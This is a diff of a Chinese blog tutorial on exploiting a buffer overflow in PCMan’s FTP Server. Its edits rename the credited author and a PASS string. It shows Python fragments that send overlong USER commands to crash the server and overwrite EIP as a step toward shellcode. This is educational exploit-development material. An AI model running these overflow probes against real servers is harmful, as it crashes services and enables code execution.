@@ -472,7 +472,7 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="PCMan’s-FTP-Server缓冲区溢出分析与利用"><a href="#PCMan’s-FTP-Server缓冲区溢出分析与利用" class="headerlink" title="PCMan’s FTP Server缓冲区溢出分析与利用"></a>PCMan’s FTP Server缓冲区溢出分析与利用</h1><p>知识大部分来源于学长<a target="_blank" rel="noopener" href="https://taonn.github.io/">Tao(Tao’s Blog)</a></p>
+                <h1 id="PCMan’s-FTP-Server缓冲区溢出分析与利用"><a href="#PCMan’s-FTP-Server缓冲区溢出分析与利用" class="headerlink" title="PCMan’s FTP Server缓冲区溢出分析与利用"></a>PCMan’s FTP Server缓冲区溢出分析与利用</h1><p>知识大部分来源于学长<a target="_blank" rel="noopener" href="https://shengnn.github.io/">Sheng(Sheng’s Blog)</a></p>
 <h3 id="简单原理"><a href="#简单原理" class="headerlink" title="简单原理"></a>简单原理</h3><blockquote>
 <p> 简单的来说，如果我们输入的数据长度超过了开发人员定义的缓冲区，那么这个数据就可以覆盖掉关键的寄存器，如EIP，EIP是指令寄存器，它存放当前指令的下一条指令的地址。如果它被来自用户输入的垃圾数据覆盖了，程序通常会崩溃，因为它跳转到的地址并尝试指向，但执行的并不是有效的指令。我们的目的就是要定制一个数据发送到程序覆盖EIP，使程序跳转到我们控制的位置，这样我们就可以执行shellcode了</p>
 </blockquote>
@@ -502,7 +502,7 @@ fuzz <span class="token operator">=</span> <span class="token number">100</span>
         <span class="token comment" spellcheck="true"># 对用户名变量进行溢出测试</span>
         s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"USER"</span> <span class="token operator">+</span> <span class="token string">"A"</span><span class="token operator">*</span>fuzz<span class="token punctuation">)</span>
         s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
-        s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"PASS Tao"</span><span class="token punctuation">)</span>
+        s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"PASS Sheng"</span><span class="token punctuation">)</span>
         s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
         <span class="token keyword">print</span> <span class="token string">"Send str length: "</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fuzz<span class="token punctuation">)</span>
         <span class="token comment" spellcheck="true"># 步长</span>
@@ -635,7 +635,7 @@ fuzz <span class="token operator">=</span> <span class="token number">2004</span
         s<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
         s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"USER"</span> <span class="token operator">+</span> <span class="token string">"A"</span><span class="token operator">*</span>fuzz <span class="token operator">+</span> <span class="token string">"B"</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span> <span class="token string">"C"</span><span class="token operator">*</span><span class="token number">1000</span><span class="token punctuation">)</span>
         s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
-        s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"PASS Tao"</span><span class="token punctuation">)</span>
+        s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"PASS Sheng"</span><span class="token punctuation">)</span>
         s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
         <span class="token keyword">print</span> <span class="token string">"Send str length: "</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fuzz<span class="token punctuation">)</span>
     <span class="token keyword">except</span> Exception<span class="token punctuation">,</span>err<span class="token punctuation">:</span>
